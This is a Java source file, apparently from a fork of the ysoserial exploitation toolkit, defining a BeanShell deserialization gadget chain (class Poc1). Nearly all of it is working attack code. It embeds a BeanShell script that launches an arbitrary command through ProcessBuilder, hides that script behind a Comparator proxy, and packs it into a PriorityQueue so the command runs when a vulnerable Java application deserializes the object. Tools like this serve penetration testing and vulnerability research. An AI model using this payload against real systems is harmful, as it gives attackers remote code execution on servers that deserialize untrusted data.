package ysoserial.payloads.tabbyGadgetChains.BeanShell1;

import bsh.Interpreter;
import bsh.XThis;
import ysoserial.Strings;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;


//from yso
public class Poc1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

    public PriorityQueue getObject(String command) throws Exception {
        // BeanShell payload

        String payload =
                "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
                        Strings.join( // does not support spaces in quotes
                                Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
                                ",", "\"", "\"") +
                        "}).start();return new Integer(1);}";

        // Create Interpreter
        Interpreter i = new Interpreter();

        // Evaluate payload
        i.eval(payload);

        // Create InvocationHandler
        XThis xt = new XThis(i.getNameSpace(), i);
        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

        // Create Comparator Proxy
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {1,1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        return priorityQueue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Poc1.class, args);
    }
}